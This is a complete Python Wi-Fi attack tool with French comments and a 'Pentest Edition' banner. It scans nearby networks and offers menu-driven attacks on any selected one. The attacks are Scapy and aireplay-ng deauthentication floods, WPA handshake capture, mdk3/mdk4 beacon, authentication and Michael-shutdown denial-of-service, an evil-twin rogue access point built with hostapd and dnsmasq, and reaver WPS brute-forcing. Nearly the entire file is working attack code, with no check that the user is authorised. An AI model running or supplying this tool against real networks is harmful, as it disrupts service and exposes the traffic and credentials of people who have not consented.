#!/usr/bin/env python3
import subprocess, os, csv, time, sys, signal
import glob as glob_module
from pathlib import Path
from threading import Thread
import shutil
import re
# Import scapy avec gestion d'erreur - IMPORT SÉLECTIF
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
    conf.verb = 0  # Désactiver les messages verbeux
except ImportError as e:
    print(f"[-] Erreur d'import Scapy: {e}")
    print("[-] Installez ou mettez à jour Scapy avec: sudo pip3 install --upgrade scapy")
    sys.exit(1)

# === Couleurs ===
RED    = "\033[1;31m"
ORANGE = "\033[1;33m"
YELLOW = "\033[93m"
GREEN  = "\033[1;32m"
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
RESET  = "\033[0m"

# === Constantes ===
SCAN_FILE_PREFIX = "/tmp/scan"
HANDSHAKE_DIR = "/tmp/handshakes"

# === Variables globales ===
active_processes = []

# === Gestion des signaux ===
def signal_handler(sig, frame):
    print(f"\n{YELLOW}[!] Interruption détectée. Nettoyage...{RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# === Bannière ===
def print_banner():
    os.system("clear")
    print(RED + r"""
          
███▄ ▄███▓ ▄▄▄       ▄████▄    █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓
▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█  ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒
▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░
▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ 
▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ 
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   
░  ░      ░  ▒   ▒▒ ░  ░  ▒    ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░    
░      ░     ░   ▒   ░         ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░      
       ░         ░  ░░ ░              ░        ░  ░  ░  ░          
""" + RESET)
    print(f"{ORANGE}                    Developed by H8Laws{RESET}")
    print(f"{CYAN}                  Enhanced Pentest Edition v2.1{RESET}\n")

# === Vérification des dépendances ===
def check_dependencies():
    deps = {
        "airmon-ng": "aircrack-ng",
        "airodump-ng": "aircrack-ng",
        "aireplay-ng": "aircrack-ng",
        "mdk3": "mdk3 (optionnel)",
        "mdk4": "mdk4 (optionnel)",
        "hostapd": "hostapd (optionnel)",
        "dnsmasq": "dnsmasq (optionnel)",
        "reaver": "reaver (optionnel)"
    }
    missing = []
    optional_missing = []
    
    for cmd, pkg in deps.items():
        if shutil.which(cmd) is None:
            if "optionnel" in pkg:
                optional_missing.append(f"{cmd} ({pkg})")
            else:
                missing.append(f"{cmd} ({pkg})")
    
    if missing:
        print(f"{RED}[-] Dépendances manquantes (REQUISES):{RESET}")
        for m in missing:
            print(f"    {RED}•{RESET} {m}")
        return False
    
    if optional_missing:
        print(f"{YELLOW}[!] Dépendances optionnelles manquantes:{RESET}")
        for m in optional_missing:
            print(f"    {YELLOW}•{RESET} {m}")
        print(f"{CYAN}[*] Ces outils ne sont pas requis pour les fonctions de base{RESET}\n")
    
    return True

# === Nettoyer les processus et fichiers ===
def cleanup():
    global active_processes
    for proc in list(active_processes):
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes = []
    
    # Nettoyer les fichiers temporaires
    for f in ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf", "/tmp/bssid_list.txt"]:
        try:
            if os.path.exists(f):
                os.remove(f)
        except:
            pass

# === Nettoyer les anciens fichiers de scan ===
def clean_scan_files():
    for file in glob_module.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
        try:
            os.remove(file)
        except Exception:
            pass  # Ignorer les erreurs silencieusement

# === Récupérer les interfaces Wi-Fi ===
def get_interfaces():
    try:
        result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        interfaces = []
        for line in result.splitlines():
            if "IEEE 802.11" in line or "Mode:Monitor" in line or "ESSID" in line:
                parts = line.split()
                if parts:
                    iface = parts[0]
                    # filtration basique pour éviter "lo" etc
                    if iface not in interfaces and not iface.startswith("lo"):
                        interfaces.append(iface)
        return interfaces
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la récupération des interfaces: {e}{RESET}")
        return []

# === Passer en mode monitor ===
def enable_monitor_mode(interface):
    try:
        # Arrêter les processus conflictuels
        print(f"{YELLOW}[*] Arrêt des processus conflictuels...{RESET}")
        subprocess.run(["airmon-ng", "check", "kill"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if interface.endswith("mon"):
            subprocess.run(["airmon-ng", "stop", interface], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            interface = interface[:-3]

        print(f"{GREEN}[+] Activation du mode monitor sur {interface}...{RESET}")
        subprocess.run(["airmon-ng", "start", interface], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Attendre que l'interface soit prête
        time.sleep(2)

        # Détecter l'interface monitor
        iwconfig_result = subprocess.check_output(["iwconfig"], 
                                                 stderr=subprocess.DEVNULL).decode()
        mon_iface = None
        for line in iwconfig_result.splitlines():
            if "Mode:Monitor" in line:
                mon_iface = line.split()[0]
                break

        if mon_iface:
            print(f"{GREEN}[+] Interface monitor détectée : {mon_iface}{RESET}")
            return mon_iface
        else:
            print(f"{RED}[-] Impossible de détecter l'interface monitor !{RESET}")
            return None
    except Exception as e:
        print(f"{RED}[-] Erreur lors de l'activation du mode monitor: {e}{RESET}")
        return None

# === Revenir en mode normal ===
def disable_monitor_mode(mon_iface):
    if mon_iface and mon_iface.endswith("mon"):
        print(f"{GREEN}[+] Désactivation du mode monitor sur {mon_iface}...{RESET}")
        subprocess.run(["airmon-ng", "stop", mon_iface], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Redémarrer NetworkManager si disponible
        subprocess.run(["systemctl", "start", "NetworkManager"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === Lancer le scan airodump ===
def run_airodump(interface, duration=15):
    clean_scan_files()
    print(f"{YELLOW}[+] Scan en cours pendant {duration} secondes...{RESET}")
    print(f"{CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{RESET}")
    
    proc = subprocess.Popen([
        "airodump-ng", "-w", SCAN_FILE_PREFIX,
        "--output-format", "csv", interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        time.sleep(duration)
        proc.terminate()
    except KeyboardInterrupt:
        proc.terminate()
    
    try:
        proc.wait(timeout=3)
    except:
        proc.kill()
    
    return proc

# === Lire les résultats du scan ===
def parse_scan_results(filename):
    aps = []
    clients = {}
    
    if not os.path.exists(filename):
        return aps, clients
        
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            section = 0
            seen_bssids = set()
            for row in reader:
                if len(row) < 1:
                    continue
                first = row[0].strip()
                if first.startswith("BSSID"):
                    section = 1
                    continue
                elif first.startswith("Station MAC") or first.startswith("Last beacon"):
                    section = 2
                    continue

                if section == 1:
                    # Correction : lecture simple de l'ESSID sans assembler les virgules
                    if len(row) < 4:
                        continue
                    bssid = row[0].strip()
                    if not bssid or bssid == "BSSID":
                        continue
                    if bssid in seen_bssids:
                        continue
                    seen_bssids.add(bssid)

                    channel = row[3].strip() if len(row) > 3 else "?"
                    if not channel or not channel.isdigit():
                        channel = "?"

                    # Power et encryption
                    power = row[8].strip() if len(row) > 8 and row[8].strip() != "" else "-100"
                    enc = row[5].strip() if len(row) > 5 else "?"
                    
                    # ESSID : simplement prendre la colonne 13 sans assembler
                    essid = ""
                    if len(row) > 13:
                        essid = row[13].strip()
                    else:
                        essid = "<hidden>"

                    if essid == "":
                        essid = "<hidden>"
                    
                    aps.append({
                        "bssid": bssid,
                        "channel": channel,
                        "essid": essid,
                        "power": power,
                        "encryption": enc
                    })
                    clients.setdefault(bssid, [])
                    
                elif section == 2:
                    if len(row) < 6:
                        continue
                    client_mac = row[0].strip()
                    ap_mac = row[5].strip()
                    if client_mac and ap_mac and ap_mac in clients:
                        if client_mac not in clients[ap_mac]:
                            clients[ap_mac].append(client_mac)
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la lecture du fichier: {e}{RESET}")
    
    return aps, clients

# === Affichage de la liste des réseaux ===
def print_ap_list(aps, clients):
    print(f"\n{BLUE}{'NUM':<5} {'ESSID':<25} {'CH':<4} {'PWR':<6} {'ENC':<12} {'CLIENTS':<8} {'BSSID':<17}{RESET}")
    print(f"{BLUE}{'='*90}{RESET}")
    
    for i, ap in enumerate(aps):
        try:
            power = int(ap['power']) if ap['power'].lstrip('-').isdigit() else -100
        except:
            power = -100
            
        power_color = GREEN if power > -70 else ORANGE if power > -85 else RED
        client_count = len(clients.get(ap['bssid'], []))
        
        print(f"{YELLOW}{i+1:<5}{RESET} "
              f"{CYAN}{ap['essid'][:24]:<25}{RESET} "
              f"{YELLOW}{ap['channel']:<4}{RESET} "
              f"{power_color}{ap['power']:<6}{RESET} "
              f"{BLUE}{ap['encryption']:<12}{RESET} "
              f"{GREEN}{client_count:<8}{RESET} "
              f"{BLUE}{ap['bssid']}{RESET}")

# === Configurer le canal ===
def set_channel(interface, channel):
    try:
        if channel.isdigit():
            subprocess.run(["iwconfig", interface, "channel", str(channel)],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# helper for filename sanitization
def sanitize_filename(s):
    s = s.strip()
    # keep letters, numbers, dash, underscore and space -> replace others with _
    s = re.sub(r'[^A-Za-z0-9 _-]', '_', s)
    s = s.replace(' ', '_')
    return s[:64]

# === 1. Attaque de déauthentification (Scapy) ===
def attack_deauth(ap, clients, interface):
    print(f"\n{GREEN}[+] Attaque de déauthentification sur {ap['essid']}{RESET}")
    
    # Vérifier le canal
    if ap['channel'] == "?":
        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
        return
        
    set_channel(interface, ap['channel'])
    
    duration_input = input(f"{ORANGE}[?] Durée en secondes (défaut: 90) : {RESET}").strip()
    duration = int(duration_input) if duration_input.isdigit() else 90
    
    client_list = clients.get(ap['bssid'], [])
    
    # Préparer les paquets de déauth
    packets = []
    
    # Paquet broadcast (vers tous les clients non identifiés)
    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
    packets.append(pkt_broadcast)
    
    if client_list:
        print(f"{CYAN}[*] {len(client_list)} client(s) détecté(s){RESET}")
        print(f"{YELLOW}1.{RESET} Attaquer tous les clients + broadcast")
        print(f"{YELLOW}2.{RESET} Cibler un client spécifique")
        print(f"{YELLOW}3.{RESET} Broadcast uniquement")
        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
        
        if choice == "2":
            print(f"\n{CYAN}Clients connectés:{RESET}")
            for idx, client in enumerate(client_list):
                print(f"{YELLOW}{idx+1}.{RESET} {client}")
            client_choice = input(f"{ORANGE}[?] Numéro du client : {RESET}").strip()
            try:
                target_client = client_list[int(client_choice)-1]
                print(f"{GREEN}[+] Ciblage de {target_client}...{RESET}")
                pkt_to_client = RadioTap() / Dot11(addr1=target_client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=target_client, addr3=target_client) / Dot11Deauth(reason=7)
                packets = [pkt_to_client, pkt_to_ap]
            except:
                print(f"{RED}[-] Choix invalide{RESET}")
                return
                
        elif choice == "1":
            print(f"{GREEN}[+] Attaque de tous les clients + broadcast...{RESET}")
            for client_mac in client_list:
                pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
                packets.extend([pkt_to_client, pkt_to_ap])
        else:
            print(f"{GREEN}[+] Attaque broadcast uniquement...{RESET}")
    else:
        print(f"{ORANGE}[!] Aucun client détecté, utilisation du mode broadcast{RESET}")
    
    # Thread d'envoi des paquets
    stop_attack = False
    
    def send_loop():
        nonlocal stop_attack
        end_time = time.time() + duration
        packet_count = 0
        print(f"{CYAN}[*] Envoi de paquets de déauthentification...{RESET}")
        
        try:
            while time.time() < end_time and not stop_attack:
                for pkt in packets:
                    if stop_attack:
                        break
                    try:
                        sendp(pkt, iface=interface, verbose=0)
                    except Exception as e:
                        print(f"{RED}[-] Erreur sendp: {e}{RESET}")
                        stop_attack = True
                        break
                    packet_count += 1
                time.sleep(0.1)
                
                # Afficher progression toutes les 500 paquets
                if packet_count and packet_count % 500 == 0:
                    elapsed = int(time.time() - (end_time - duration))
                    remaining = max(0, duration - elapsed)
                    print(f"{YELLOW}[*] {packet_count} paquets envoyés | Temps restant: {remaining}s{RESET}")
        except Exception as e:
            print(f"{RED}[-] Erreur lors de l'envoi: {e}{RESET}")
        
        print(f"{GREEN}[+] Attaque terminée. Total: {packet_count} paquets envoyés{RESET}")
    
    # Lancer l'attaque dans un thread
    attack_thread = Thread(target=send_loop)
    attack_thread.daemon = True
    attack_thread.start()
    
    try:
        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
        stop_attack = True
        attack_thread.join(timeout=2)
    except KeyboardInterrupt:
        stop_attack = True
        attack_thread.join(timeout=2)

# === 2. Capture de handshake ===
def capture_handshake(ap, clients, interface):
    print(f"\n{GREEN}[+] Capture de handshake pour {ap['essid']}{RESET}")
    
    if ap['channel'] == "?":
        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
        return
    
    # Créer le dossier de handshakes
    Path(HANDSHAKE_DIR).mkdir(exist_ok=True)
    
    safe_name = sanitize_filename(ap['essid'])
    output_file = f"{HANDSHAKE_DIR}/{safe_name}_{ap['bssid'].replace(':', '')}"
    
    set_channel(interface, ap['channel'])
    
    # Menu pour choisir la méthode de déauth
    print(f"\n{CYAN}[*] Choisissez la méthode de déauthentification:{RESET}")
    print(f"{YELLOW}1.{RESET} aireplay-ng (standard)")
    print(f"{YELLOW}2.{RESET} mdk3/mdk4 (plus agressif)")
    print(f"{YELLOW}3.{RESET} Scapy (personnalisé)")
    print(f"{YELLOW}4.{RESET} Capture sans déauth (écoute passive)")
    
    method_choice = input(f"{ORANGE}[?] Méthode : {RESET}").strip()
    
    # Lancer airodump pour capturer
    print(f"{CYAN}[*] Démarrage de la capture...{RESET}")
    capture_proc = subprocess.Popen([
        "airodump-ng", "-c", ap['channel'],
        "--bssid", ap['bssid'],
        "-w", output_file,
        interface
    ])
    active_processes.append(capture_proc)
    
    time.sleep(3)
    
    # Lancer la déauthentification en fonction du choix
    if method_choice == "1":
        print(f"{GREEN}[+] Déauthentification via aireplay-ng...{RESET}")
        client_list = clients.get(ap['bssid'], [])
        if client_list:
            for client in client_list:
                subprocess.Popen([
                    "aireplay-ng", "--deauth", "10",
                    "-a", ap['bssid'], "-c", client, interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([
                "aireplay-ng", "--deauth", "10",
                "-a", ap['bssid'], interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    elif method_choice == "2":
        # MDK3/MDK4
        mdk_cmd = None
        if shutil.which("mdk4") is not None:
            mdk_cmd = "mdk4"
        elif shutil.which("mdk3") is not None:
            mdk_cmd = "mdk3"
        else:
            print(f"{RED}[-] mdk3/mdk4 n'est pas installé !{RESET}")
            mdk_cmd = None
        
        if mdk_cmd:
            print(f"{GREEN}[+] Déauthentification via {mdk_cmd}...{RESET}")
            try:
                with open("/tmp/bssid_list.txt", "w") as f:
                    f.write(ap['bssid'] + "\n")
                subprocess.Popen([mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                print(f"{RED}[-] Erreur avec {mdk_cmd}{RESET}")
    
    elif method_choice == "3":
        print(f"{GREEN}[+] Déauthentification via Scapy...{RESET}")
        client_list = clients.get(ap['bssid'], [])
        
        def scapy_deauth():
            end_time = time.time() + 30
            while time.time() < end_time:
                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                try:
                    sendp(pkt, iface=interface, verbose=0)
                except:
                    pass
                for client in client_list:
                    pkt2 = RadioTap() / Dot11(addr1=client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                    try:
                        sendp(pkt2, iface=interface, verbose=0)
                    except:
                        pass
                time.sleep(0.1)
        
        scapy_thread = Thread(target=scapy_deauth)
        scapy_thread.daemon = True
        scapy_thread.start()
    
    elif method_choice == "4":
        print(f"{CYAN}[*] Capture passive en cours (sans déauthentification)...{RESET}")
    
    else:
        print(f"{RED}[-] Choix invalide, pas de déauthentification{RESET}")
    
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter la capture...{RESET}")
    cleanup()
    
    print(f"{GREEN}[+] Capture sauvegardée dans {output_file}-*.cap{RESET}")

# === 3. Attaque par flood (DoS) ===
def attack_flood(ap, interface):
    print(f"\n{GREEN}[+] Attaque par flood sur {ap['essid']}{RESET}")
    
    if ap['channel'] == "?":
        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
        return
        
    set_channel(interface, ap['channel'])
    
    # Vérifier mdk4 d'abord (plus stable)
    mdk_cmd = None
    if shutil.which("mdk4") is not None:
        mdk_cmd = "mdk4"
    elif shutil.which("mdk3") is not None:
        mdk_cmd = "mdk3"
    else:
        print(f"{RED}[-] mdk3/mdk4 n'est pas installé !{RESET}")
        return
    
    print(f"{CYAN}[*] Utilisation de {mdk_cmd}{RESET}")
    print(f"{YELLOW}1.{RESET} Beacon Flood (saturation de faux AP)")
    print(f"{YELLOW}2.{RESET} Authentication DoS")
    print(f"{YELLOW}3.{RESET} Deauthentication Flood")
    print(f"{YELLOW}4.{RESET} Michael Shutdown Exploitation")
    
    choice = input(f"{ORANGE}[?] Type d'attaque : {RESET}").strip()
    
    # Créer fichier BSSID
    try:
        with open("/tmp/bssid_list.txt", "w") as f:
            f.write(ap['bssid'] + "\n")
    except:
        print(f"{RED}[-] Erreur lors de la création du fichier BSSID{RESET}")
        return
    
    try:
        if choice == "1":
            proc = subprocess.Popen([mdk_cmd, interface, "b", "-c", ap['channel']])
        elif choice == "2":
            proc = subprocess.Popen([mdk_cmd, interface, "a", "-a", ap['bssid']])
        elif choice == "3":
            proc = subprocess.Popen([mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']])
        elif choice == "4":
            proc = subprocess.Popen([mdk_cmd, interface, "m", "-t", ap['bssid']])
        else:
            print(f"{RED}[-] Choix invalide{RESET}")
            return
        
        active_processes.append(proc)
        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
        cleanup()
    except Exception as e:
        print(f"{RED}[-] Erreur lors de l'attaque: {e}{RESET}")

# === 4. Evil Twin / Rogue AP ===
def attack_evil_twin(ap, interface):
    print(f"\n{GREEN}[+] Création d'un Evil Twin pour {ap['essid']}{RESET}")
    
    # Vérifier les dépendances
    if shutil.which("hostapd") is None:
        print(f"{RED}[-] hostapd n'est pas installé !{RESET}")
        return
    if shutil.which("dnsmasq") is None:
        print(f"{RED}[-] dnsmasq n'est pas installé !{RESET}")
        return
    
    if ap['channel'] == "?":
        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
        return

    # Si interface en mode monitor, repasser à l'interface normale automatiquement
    iface_for_hostapd = interface
    if interface.endswith("mon"):
        print(f"{YELLOW}[!] Interface {interface} détectée en mode monitor, arrêt du mode monitor pour hostapd...{RESET}")
        subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        iface_for_hostapd = interface[:-3]
        # Donner un peu de temps pour que l'interface revienne en managed
        time.sleep(1)

    # Configuration hostapd
    hostapd_conf = f"""interface={iface_for_hostapd}
driver=nl80211
ssid={ap['essid']}
hw_mode=g
channel={ap['channel']}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    
    try:
        with open("/tmp/hostapd.conf", "w") as f:
            f.write(hostapd_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration{RESET}")
        return
    
    # Configuration dnsmasq
    dnsmasq_conf = f"""interface={iface_for_hostapd}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""
    
    try:
        with open("/tmp/dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration{RESET}")
        return
    
    print(f"{CYAN}[*] Configuration de l'interface...{RESET}")
    subprocess.run(["ifconfig", iface_for_hostapd, "192.168.1.1", "netmask", "255.255.255.0"],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{GREEN}[+] Démarrage de hostapd...{RESET}")
    hostapd_proc = subprocess.Popen([
        "hostapd", "/tmp/hostapd.conf"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_processes.append(hostapd_proc)
    
    time.sleep(2)
    
    print(f"{GREEN}[+] Démarrage de dnsmasq...{RESET}")
    dnsmasq_proc = subprocess.Popen([
        "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_processes.append(dnsmasq_proc)
    
    print(f"{GREEN}[+] Evil Twin actif !{RESET}")
    print(f"{CYAN}[*] SSID: {ap['essid']}{RESET}")
    print(f"{CYAN}[*] Password: password123{RESET}")
    print(f"{CYAN}[*] Les clients qui se connectent obtiendront une IP 192.168.1.x{RESET}")
    
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
    cleanup()

# === 5. WPS Attack ===
def attack_wps(ap, interface):
    print(f"\n{GREEN}[+] Attaque WPS sur {ap['essid']}{RESET}")
    
    # Vérifier si reaver est installé
    if shutil.which("reaver") is None:
        print(f"{RED}[-] Reaver n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install reaver{RESET}")
        return
    
    if ap['channel'] == "?":
        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
        return
        
    set_channel(interface, ap['channel'])
    
    print(f"{CYAN}[*] Démarrage de l'attaque WPS...{RESET}")
    print(f"{YELLOW}[!] Ceci peut prendre plusieurs heures{RESET}")
    
    try:
        proc = subprocess.Popen([
            "reaver", "-i", interface,
            "-b", ap['bssid'],
            "-c", ap['channel'],
            "-vv", "-L", "-N"
        ])
        active_processes.append(proc)
        
        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
        cleanup()
    except Exception as e:
        print(f"{RED}[-] Erreur lors de l'attaque: {e}{RESET}")

# === Menu d'attaque (SUITE) ===
def attack_menu(ap, clients, interface):
    while True:
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{CYAN}Target: {ap['essid']} ({ap['bssid']}){RESET}")
        print(f"{CYAN}Channel: {ap['channel']} | Power: {ap['power']} dBm | Clients: {len(clients.get(ap['bssid'], []))}{RESET}")
        print(f"{BLUE}{'='*60}{RESET}")
        print(f"{YELLOW}1.{RESET} Déauthentification (Deauth)")
        print(f"{YELLOW}2.{RESET} Capture de Handshake")
        print(f"{YELLOW}3.{RESET} Attaque par Flood (DoS)")
        print(f"{YELLOW}4.{RESET} Evil Twin / Rogue AP")
        print(f"{YELLOW}5.{RESET} WPS Attack (Reaver)")
        print(f"{YELLOW}6.{RESET} Rescanner les réseaux")
        print(f"{YELLOW}0.{RESET} Retour")
        
        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
        
        if choice == "1":
            attack_deauth(ap, clients, interface)
        elif choice == "2":
            capture_handshake(ap, clients, interface)
        elif choice == "3":
            attack_flood(ap, interface)
        elif choice == "4":
            attack_evil_twin(ap, interface)
        elif choice == "5":
            attack_wps(ap, interface)
        elif choice == "6":
            return "rescan"
        elif choice == "0":
            break
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")

# === Programme principal ===
def main():
    # Vérifier root
    if os.geteuid() != 0:
        print(f"{RED}[-] Ce script doit être exécuté en tant que root !{RESET}")
        sys.exit(1)
    
    print_banner()
    
    # Vérifier les dépendances
    if not check_dependencies():
        print(f"\n{RED}[-] Veuillez installer les dépendances manquantes{RESET}")
        sys.exit(1)
    
    # Sélection de l'interface
    interfaces = get_interfaces()
    if not interfaces:
        print(f"{RED}[-] Aucune interface Wi-Fi détectée !{RESET}")
        return
    
    print(f"{BLUE}Interfaces disponibles:{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{YELLOW} {i+1}.{RESET} {iface}")
    
    choice = input(f"{ORANGE}[?] Sélectionnez une interface (1-{len(interfaces)}): {RESET}").strip()
    try:
        iface = interfaces[int(choice)-1]
    except:
        print(f"{RED}[-] Choix invalide !{RESET}")
        return

    # Activer le mode monitor
    mon_iface = enable_monitor_mode(iface)
    if not mon_iface:
        print(f"{RED}[-] Impossible d'activer le mode monitor{RESET}")
        return

    try:
        while True:
            # Scanner les réseaux
            run_airodump(mon_iface)
            
            # Parser les résultats
            csv_file = f"{SCAN_FILE_PREFIX}-01.csv"
            aps, clients = parse_scan_results(csv_file)
            
            if not aps:
                print(f"{RED}[-] Aucun réseau détecté !{RESET}")
                retry = input(f"{ORANGE}[?] Rescanner? (y/N): {RESET}").strip().lower()
                if retry != 'y':
                    break
                continue
            
            # Afficher les réseaux
            print_ap_list(aps, clients)
            
            # Sélection du réseau
            choice = input(f"\n{ORANGE}[?] Sélectionnez le réseau (num) ou 'r' pour rescanner: {RESET}").strip()
            
            if choice.lower() == 'r':
                continue
            
            try:
                ap = aps[int(choice)-1]
            except:
                print(f"{RED}[-] Choix invalide !{RESET}")
                continue
            
            # Menu d'attaque
            result = attack_menu(ap, clients, mon_iface)
            if result != "rescan":
                break
                
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interruption...{RESET}")
    finally:
        cleanup()
        disable_monitor_mode(mon_iface)
        print(f"\n{GREEN}[+] Nettoyage terminé. Au revoir !{RESET}")

if __name__ == "__main__":
    main()